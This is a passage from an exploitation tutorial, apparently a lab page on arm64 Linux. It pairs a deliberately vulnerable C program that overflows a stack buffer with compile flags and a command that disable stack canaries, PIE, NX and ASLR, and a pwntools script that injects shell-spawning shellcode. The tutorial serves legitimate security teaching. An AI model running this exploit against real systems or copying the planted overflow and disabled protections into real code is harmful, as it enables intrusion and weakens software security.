## Linux

### Code

```c
#include <stdio.h>
#include <unistd.h>

void vulnerable_function() {
    char buffer[64];
    read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
    vulnerable_function();
    return 0;
}
```

Compile without pie, canary and nx:

```bash
clang -o bof bof.c -fno-stack-protector -Wno-format-security -no-pie -z execstack
```

### No ASLR & No canary - Stack Overflow

To stop ASLR execute:

```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

To get the [**offset of the bof check this link**](../ret2win/ret2win-arm64.md#finding-the-offset).

Exploit:

```python
from pwn import *

# Load the binary
binary_name = './bof'
elf = context.binary = ELF(binary_name)

# Generate shellcode
shellcode = asm(shellcraft.sh())

# Start the process
p = process(binary_name)

# Offset to return address
offset = 72

# Address in the stack after the return address
ret_address = p64(0xfffffffff1a0)

# Craft the payload
payload = b'A' * offset + ret_address + shellcode

print("Payload length: "+ str(len(payload)))

# Send the payload
p.send(payload)

# Drop to an interactive session
p.interactive()
```

The only "complicated" thing to find here would be the address in the stack to call. In my case I generated the exploit with the address found using gdb, but then when exploiting it it didn't work (because the stack address changed a bit).

I opened the generated **`core` file** (`gdb ./bog ./core`) and checked the real address of the start of the shellcode.


## macOS

> [!TIP]
> It's not possible to disable NX in macOS because in arm64 this mode is implemented at hardware level so you can't disable it, so you won't be finding examples with shellcode in stack in macOS.
